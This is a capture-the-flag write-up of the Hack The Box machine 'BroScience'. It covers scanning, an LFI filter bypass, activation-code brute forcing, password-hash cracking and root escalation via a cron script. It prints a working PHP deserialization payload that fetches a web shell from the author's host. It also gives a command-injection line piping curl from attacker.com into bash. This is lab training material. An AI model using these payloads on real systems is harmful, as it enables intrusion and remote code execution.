# BroScience!
## @Author : M3tr1_r00t
![BroScience](https://user-images.githubusercontent.com/99975622/219904987-5c53e8de-d60d-43f2-addf-7317545acbc6.png)

### Enumeration
#### Nmap...
```
# Nmap 7.93 scan initiated Sun Jan  8 21:10:44 2023 as: nmap -sC -sV -A -p 22,80,443 -oN nmapports.txt 10.129.93.160
Nmap scan report for 10.129.93.160
Host is up (0.27s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)
|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)
|_  256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.54 (Debian)
| tls-alpn: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   246.60 ms 10.10.14.1
2   244.96 ms 10.129.93.160

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan  8 21:11:23 2023 -- 1 IP address (1 host up) scanned in 39.59 seconds

```
#### Dirsearch...
```
# Dirsearch started Sun Jan  8 21:19:21 2023 as: dirsearch.py -u https://broscience.htb -w /usr/share/wordlists/dirb/common.txt -o /home/kali/Desktop/BroScience/dirsearch.txt

301   319B   https://broscience.htb:443/images    -> REDIRECTS TO: https://broscience.htb/images/
301   321B   https://broscience.htb:443/includes    -> REDIRECTS TO: https://broscience.htb/includes/
200     9KB  https://broscience.htb:443/index.php
301   323B   https://broscience.htb:443/javascript    -> REDIRECTS TO: https://broscience.htb/javascript/
301   319B   https://broscience.htb:443/manual    -> REDIRECTS TO: https://broscience.htb/manual/
403   280B   https://broscience.htb:443/server-status
301   319B   https://broscience.htb:443/styles    -> REDIRECTS TO: https://broscience.htb/styles/

```
### Foothold as www-data...
![Screenshot_2023-01-08_21_23_27](https://user-images.githubusercontent.com/99975622/219873868-1616d5b0-e5ff-45b7-a086-f6a2a8f714ce.png)
We can take a look at the /includes directory 
 Typically the /includes directory contains files that are included in multiple pages of the website. These files can include header and footer sections, navigation menus, sidebars, and other common elements that appear on many pages of the site.
 
 ![Screenshot_2023-01-08_21_23_37](https://user-images.githubusercontent.com/99975622/219874407-9111de86-98e7-4379-a4fa-142dd9869bfe.png)
 
 After clicking on a couple of the php files, we find one, ```img.php```, which then asks for a path variable.
 ![Screenshot_2023-01-08_21_27_13](https://user-images.githubusercontent.com/99975622/219874534-d567c629-d951-4483-8a03-3ae0ee8c9e0f.png)
 After trying to get an lfi, we get an ```Error: Attack Detected.```
 
![Screenshot_2023-01-08_21_27_31](https://user-images.githubusercontent.com/99975622/219874705-b81b427e-273d-48e5-ab9e-273d3a32172c.png)
We can try and do some bypassing, if we try to url encode, we still get the same error.
![Screenshot_2023-01-08_21_30_05](https://user-images.githubusercontent.com/99975622/219874926-10218804-57b4-442a-8774-c747125ddc36.png)
If we try to url encode this, it finally works.
![Screenshot_2023-01-08_21_30_17](https://user-images.githubusercontent.com/99975622/219874969-4874d8d6-ca12-466e-a744-794af3ad36bb.png)
We can see there was some few lfi checks put in place.
Now that we have an lfi, i made a python/ruby script to make this a little bit more easier...

In our dirsearch scan, I found a /login.php.
![Screenshot_2023-01-08_22_36_45](https://user-images.githubusercontent.com/99975622/219875343-fa504106-e1d7-4222-bbd3-11f12a2991d1.png)
Since we dont have any valid credentials, we can try and create an account.
![Screenshot_2023-01-08_22_36_50](https://user-images.githubusercontent.com/99975622/219875568-368479c3-6949-453b-afe6-08736ca4870b.png)
After creating an account,we are being asked for an activation code which should have been sent to the email.

![Screenshot_2023-01-08_22_37_23](https://user-images.githubusercontent.com/99975622/219875614-0ea74c2b-1089-4192-9bbd-aeeebdb6508f.png)
Now this was the tricky part.
Since we have the lfi in place, we can utilize it and look if we can find the piece of code that generates this  activation code,in this code, it is the ```utlis.php```
![Screenshot_2023-01-08_22_31_58](https://user-images.githubusercontent.com/99975622/219875845-0048a582-f37c-4ee8-999b-a7c28a174696.png)

If we look keenly at the ```generate_activation_code()``` function, we can see and try to make a payload to get our activation code.

For this to work, we need to modify the ```generate_activation_code()``` function...

We need to change the value in the for loop to generate a lot of activation codes for us and see if we can bruteforce the activation code and get our account activated.

We can use this php sandbox to generate the activation codes...
```
https://onlinephp.io/
```
After modifying the code, click on the play sign to run the script...
![Screenshot_2023-01-08_22_40_35](https://user-images.githubusercontent.com/99975622/219875954-2ee9f78f-d793-4208-b84e-1d32c0cf71ae.png)
then copy the output to a file. 
After that, we can now activate our account via a bruteforce using ffuf.
```
ffuf -c -u https://broscience.htb/activate.php\?code\=FUZZ -w fuzz.txt -fw 293
```
![Screenshot_2023-01-08_22_40_52](https://user-images.githubusercontent.com/99975622/219899394-9b0a8ef3-c53c-4f53-9cab-47d904e49d57.png)

Now we can login to the site using our newly created account.
![Screenshot_2023-01-08_22_41_30](https://user-images.githubusercontent.com/99975622/219899430-b9d96880-911c-4a94-964a-44e084999d62.png)
If we check for cookies on the site, we find a non-default cookie, user-prefs...
![Screenshot_2023-01-08_22_42_01](https://user-images.githubusercontent.com/99975622/219899568-21a27301-5afc-48b3-803e-3ad9d382f546.png)
If you keenly look at the cookie, it seems to be base64 encoded...
![Screenshot_2023-01-08_22_43_03](https://user-images.githubusercontent.com/99975622/219899705-a5f91b35-b081-4123-b28d-929b12b082df.png)

Wierdly enough, this cookie is being directly invoked into the index.php file....
![Screenshot_2023-01-08_22_43_41](https://user-images.githubusercontent.com/99975622/219900381-e393c328-4dec-4d57-a7d2-8bdf2c33f460.png)
With that, we have our entry point...

We can use this code as our payload, base64 encode it and place it as our cookie and send it off to get a reverse shell.
```
<?php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = "http://10.10.14.101:8081/w.php";
    public $imgPath = "./w.php";

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

echo base64_encode(serialize(new AvatarInterface));
?> 

```
Here's the modified payload...
![Screenshot_2023-01-08_22_57_17](https://user-images.githubusercontent.com/99975622/219903026-367d2047-a919-4198-9b72-b0a2f7a0a893.png)

And after base64 encoding it, we get our reverse shell
![Screenshot_2023-01-08_23_48_48](https://user-images.githubusercontent.com/99975622/219903120-aaaafd48-c89f-43e2-92c6-58e2e16e2584.png)
### Www-data to User
After checking the local files, i found a db file containing the database credentials... 
![Screenshot_2023-01-08_23_52_19](https://user-images.githubusercontent.com/99975622/219903484-2003d067-8333-4fe0-880b-80108bf7ae29.png)
We can try to login and see if we find any valuable data from it...
![Screenshot_2023-01-08_23_57_56](https://user-images.githubusercontent.com/99975622/219903523-7bfaffa2-4933-44a3-ae48-6e0c98db0ab0.png)
We find some credentials but they are salted...
![Screenshot_2023-01-09_00_01_21](https://user-images.githubusercontent.com/99975622/219903580-48d8d37b-7f79-4f08-91de-1f5248c8e3bd.png)
With that,we can try and crack them using hashcat...
![Screenshot_2023-01-09_00_05_46](https://user-images.githubusercontent.com/99975622/219903834-ca812d86-b934-4875-8b20-8b1b55a3a78e.png)

Hashcat then found 3 of the 5 credentials
![Screenshot_2023-01-09_00_07_06](https://user-images.githubusercontent.com/99975622/219903825-128c4871-fd05-45c5-b113-b86bfbfbe044.png)

The creds...
![Screenshot_2023-01-09_00_08_45](https://user-images.githubusercontent.com/99975622/219903866-5e3e1f88-3284-4ad6-b21a-8eedd0346366.png)
Since we already know the users on the box, lets try to login as bill via ssh.
![Screenshot_2023-01-09_00_10_27](https://user-images.githubusercontent.com/99975622/219903902-2ee3e27e-364b-40fc-81b7-978382651042.png)

We have our user.txt flag.
### User to root
#### More Enumeration...

![Screenshot_2023-01-09_00_13_17](https://user-images.githubusercontent.com/99975622/219903973-43067037-47cd-497d-807d-aa2d58936a4b.png)

After a bit of enumeration, i came across a file in the opt directory, ```cert_renew.sh```
```
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
```

So basically what this script does is that: 

- Checks if the script was invoked with a single argument that is the name of a certificate file, or the argument is "-h", "--help", or "help". If not, it displays usage information and exits.
- Checks if the certificate file specified exists. If not, it displays an error message and exits.
- Checks if the certificate is due for renewal. If it is not due yet, it displays a message and exits.
- Extract the subject information from the certificate and parse it into separate fields such as country, state, locality, organization, organization unit, common name, and email address.
- Generate a new self-signed certificate with the same subject information as the original certificate and save it in the "/home/bill/Certs/" directory with the same common name as the original certificate.
- Display the subject information of the original certificate and the generated certificate.

 The script assumes that the "openssl" command is installed on the system, and that the user running the script has write permissions to the "/home/bill/Certs/" directory.

#### Vulnerabilities...
##### Directory traversal...
This script has 2 identifiable vulnerabilities. One is that there is a possible path travesal.
```
/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"

```
This line moves the generated certificate file from the temporary directory /tmp to a directory specified by the variable $commonName.crt under the /home/bill/Certs directory. However, the value of $commonName is not sanitized or checked, which means that an attacker could potentially include directory traversal characters (such as ../) in the certificate's common name, leading to the certificate being moved to a different directory than intended. This could allow the attacker to overwrite or access files in other directories on the system, potentially leading to a compromise of the system.

##### Possible R.C.E...
e vulnerability is due to the use of user input without proper validation or sanitization in the openssl req command that generates a new certificate. Specifically, the values of $country, $state, $locality, $organization, $organizationUnit, $commonName, and $emailAddress are concatenated and passed to the command using a here-string (<<<). If any of these values contain special characters or shell metacharacters, an attacker could inject additional commands or modify the existing command.

Possible RCE...
```
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
$state
$locality
$organization
$organizationUnit
; curl http://attacker.com/malware.sh | bash #
$emailAddress
" 2>/dev/null

```
This would send a curl request of a reverse shell as root.

#### RCE Execution...
So to bypass this, we need to set a new certificate which is set to expire in the next 1 day for the script to be executed accordingly....
 ![Screenshot_2023-01-09_00_33_30](https://user-images.githubusercontent.com/99975622/219904901-ddd211b9-6cff-4f19-b1d8-8ace22209806.png)
My guess is that the script was in a crob tab running as root and sure thing it is!
![Screenshot_2023-01-09_00_33_59](https://user-images.githubusercontent.com/99975622/219904931-25ed6080-78d7-4215-8d81-bff96d4be613.png)
Funny enough, there was also another script which returned the web-server and the databse to its default state after some time!
![Screenshot_2023-01-09_00_34_24](https://user-images.githubusercontent.com/99975622/219904957-bd656a83-268e-4d05-86bb-faf7b6a25dbd.png)

## My socials:
<br>@ twitter: https://twitter.com/M3tr1c_root
<br>@ instagram: https://instagram.com/m3tr1c_r00t/
